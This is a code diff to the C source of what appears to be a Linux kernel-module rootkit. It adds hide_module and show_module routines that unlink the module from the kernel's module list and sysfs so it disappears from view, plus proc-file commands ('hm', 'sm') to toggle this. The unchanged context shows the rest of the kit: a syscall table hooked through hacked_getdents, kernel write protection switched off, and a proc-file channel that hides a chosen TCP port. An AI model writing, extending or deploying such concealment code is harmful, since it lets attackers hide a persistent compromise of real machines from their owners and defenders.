@@ -36,9 +36,11 @@ int TCP_fd = -10;
 static struct proc_dir_entry *proc_file;
 static unsigned long procfs_buffer_size = 0;
 struct list_head *prev_module;
+struct list_head *prev_kobj;
 unsigned long long *syscall_table;
 static char buff1[BUF_SIZE];
 static char buff2[BUF_SIZE];
+bool module_hidden;
 
 // original functions
 asmlinkage int (*original_open)(const char *, int);
@@ -64,11 +66,47 @@ void disable_write_protection(void) {
   return;
 }
 
+void hide_module(void) {
+  if (module_hidden) return;
+  prev_module = THIS_MODULE->list.prev;
+  prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
+
+  mutex_lock(&module_mutex);
+
+  list_del_rcu(&THIS_MODULE->list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);
+
+  synchronize_rcu();
+  kfree(THIS_MODULE->notes_attrs);
+  THIS_MODULE->notes_attrs = NULL;
+  kfree(THIS_MODULE->sect_attrs);
+  THIS_MODULE->sect_attrs = NULL;
+  kfree(THIS_MODULE->mkobj.mp);
+  THIS_MODULE->mkobj.mp = NULL;
+  THIS_MODULE->modinfo_attrs->attr.name = NULL;
+  kfree(THIS_MODULE->mkobj.drivers_dir);
+  THIS_MODULE->mkobj.drivers_dir = NULL;
+
+  mutex_unlock(&module_mutex);
+  module_hidden = true;
+}
+
+void show_module(void) {
+  if (!module_hidden) return;
+  mutex_lock(&module_mutex);
+  list_add_rcu(&THIS_MODULE->list, prev_module);
+  //list_add_rcu(&THIS_MODULE->mkobj.kobj.entry, prev_kobj);
+  synchronize_rcu();
+  mutex_unlock(&module_mutex);
+  module_hidden = false;
+}
+
 long str_to_lng(const char *str)
 {
   long res = 0, mul = 1;
   const char *ptr;
-  
+
   for(ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
     ptr--;
 
@@ -78,17 +116,17 @@ long str_to_lng(const char *str)
 
     res += (*ptr - '0') * mul;
     mul *= 10;
-    ptr--;  
+    ptr--;
   }
   return res;
 }
 
 // splits the input into 2 commands
 void split_buffer(char* procfs_buffer)
-{ 
+{
   int i,j;
   bool flag = true;
-  
+
   for(i = 0; i < BUF_SIZE; i++)
   {
     if(procfs_buffer[i] == ' ' || procfs_buffer[i] == '\n')
@@ -102,11 +140,11 @@ void split_buffer(char* procfs_buffer)
   }
 
   if(!flag) return;
-  
+
   for(j = 0; j < BUF_SIZE && i < BUF_SIZE; i++, j++)
   {
     if(procfs_buffer[i] == '\n')
-    { 
+    {
       buff2[i] = '\0';
       break;
     }
@@ -131,7 +169,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   result = (*orig_getdents)(fd,dirp,count);
   if (result <= 0)
     return result;
-  
+
   // get pathname
   current_files = current->files;
   files_table = files_fdtable(current_files);
@@ -272,7 +310,7 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
       hack_getdents();
       enable_write_protection();
       proc_hidden = true;
-    } 
+    }
     return count;
   }
 
@@ -289,6 +327,15 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
     return count;
   }
 
+  if (kernel_buf[0] == 'h' &&  kernel_buf[1] == 'm') {
+    printk("hiding module\n");
+    hide_module();
+  }
+
+  if (kernel_buf[0] == 's' &&  kernel_buf[1] == 'm') {
+    printk("showing module\n");
+    show_module();
+  }
   // hp port number decimal value
   if (kernel_buf[0] == 'h' &&  kernel_buf[1] == 'p') {
     PORT_TO_HIDE = 0;
@@ -302,8 +349,8 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
       PORT_TO_HIDE = PORT_TO_HIDE + c;
       temp = false;
     }
+    printk("NEW PORT TO HIDE IS: %d\n ", PORT_TO_HIDE);
   }
-  printk("NEW TO HIDE IS: %d\n ", PORT_TO_HIDE);
   printk("finished writing to the proc file\n");
   return count;
 }
@@ -329,36 +376,6 @@ unsigned long **find(void) {
   return NULL;
 }
 
-void hide_module(void) {
-  prev_module = THIS_MODULE->list.prev;
-
-  mutex_lock(&module_mutex);
-
-  list_del_rcu(&THIS_MODULE->list);
-  kobject_del(&THIS_MODULE->mkobj.kobj);
-  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);
-
-  synchronize_rcu();
-
-  kfree(THIS_MODULE->notes_attrs);
-  THIS_MODULE->notes_attrs = NULL;
-  kfree(THIS_MODULE->sect_attrs);
-  THIS_MODULE->sect_attrs = NULL;
-  kfree(THIS_MODULE->mkobj.mp);
-  THIS_MODULE->mkobj.mp = NULL;
-  THIS_MODULE->modinfo_attrs->attr.name = NULL;
-  kfree(THIS_MODULE->mkobj.drivers_dir);
-  THIS_MODULE->mkobj.drivers_dir = NULL;
-
-  mutex_unlock(&module_mutex);
-}
-
-void show_module(void) {
-  mutex_lock(&module_mutex);
-  list_add_rcu(&THIS_MODULE->list, prev_module);
-  synchronize_rcu();
-  mutex_unlock(&module_mutex);
-}
 
 static int init(void) {
   // hide_module();
